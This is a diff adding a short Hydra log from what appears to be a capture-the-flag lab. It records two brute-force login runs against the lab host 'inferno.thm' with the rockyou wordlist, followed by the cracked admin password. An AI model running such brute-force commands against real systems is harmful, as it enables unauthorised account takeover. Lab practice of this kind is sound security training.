@@ -1,0 +1,3 @@
+# Hydra v9.3 run at 2022-11-23 15:21:15 on inferno.thm http-get (hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -o hydra.log inferno.thm http-get /inferno/)
+# Hydra v9.3 run at 2022-11-23 15:22:01 on inferno.thm http-get (hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -o hydra.log -t 64 inferno.thm http-get /inferno/)
+[80][http-get] host: inferno.thm   login: admin   password: dante1
